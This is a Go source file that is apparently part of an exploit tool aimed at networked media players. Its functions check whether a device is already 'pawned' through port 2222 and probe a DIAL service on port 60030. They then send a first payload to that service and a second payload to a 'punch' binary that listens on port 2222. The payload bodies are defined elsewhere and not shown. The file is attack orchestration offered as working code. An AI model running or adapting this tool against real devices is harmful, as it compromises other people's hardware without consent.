package internal

import (
	"fmt"
	"net"
	"time"
)

// Rewrite
func IsPort2222Open(ip string) bool {
	address := fmt.Sprintf("%s:%d", ip, 2222)
	conn, err := net.DialTimeout("tcp", address, 2*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	fmt.Println("player already pawned")
	return true
}

func IsPlayerAvailable(ip string) bool {
	address := fmt.Sprintf("%s:60030", ip)
	conn, err := net.DialTimeout("tcp", address, 2*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	//getRequest := "GET /dial_srv/apps/hello HTTP/1.1\r\nHost: " + ip + ":60030\r\nConnection: close\r\n\r\n"
	_, err = conn.Write([]byte(getRequestStart + ip + getRequestEnd))
	if err != nil {
		return false
	}

	response := make([]byte, 1024)
	_, err = conn.Read(response)
	if err != nil {
		return false
	}

	return true
}

func SendFirstPayload(ip string) error {
	// Connect to the IP on port 60030
	conn, err := net.Dial("tcp", ip+":60030")
	if err != nil {
		return err
	}
	defer conn.Close()

	// Send the first payload
	_, err = conn.Write([]byte(firstPayloadStart + ip + firstPayloadEnd))
	return err
}

func SendSecondPayload(ip string) error {
	// Connect to the IP on port 2222 (where punch binary is listening)
	conn, err := net.Dial("tcp", ip+":2222")
	if err != nil {
		return err
	}
	defer conn.Close()

	// Send the second payload
	_, err = conn.Write([]byte(secondPayload))
	return err
}
